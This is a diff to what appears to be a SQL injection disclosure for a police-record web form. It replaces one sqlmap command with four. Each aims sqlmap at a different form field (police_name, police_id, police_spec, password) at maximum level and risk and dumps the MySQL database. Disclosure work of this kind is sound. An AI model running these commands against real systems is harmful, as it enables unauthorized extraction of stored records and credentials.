@@ -63,7 +63,16 @@ police_name=123&police_id=123&police_spec=123&password=123&s=Submit
 Use `sqlmap` with `-r` option to exploit the vulnerability:
 
 ```
-sqlmap -r police_add.txt --level 5 --risk 3 --batch --dbms MYSQL --dump
+sqlmap -r police_add.txt --level 5 --risk 3 --batch --dbms MYSQL --dump -p police_name
+```
+```
+sqlmap -r police_add.txt --level 5 --risk 3 --batch --dbms MYSQL --dump -p police_id
+```
+```
+sqlmap -r police_add.txt --level 5 --risk 3 --batch --dbms MYSQL --dump -p police_spec
+```
+```
+sqlmap -r police_add.txt --level 5 --risk 3 --batch --dbms MYSQL --dump -p password
 ```
 
 
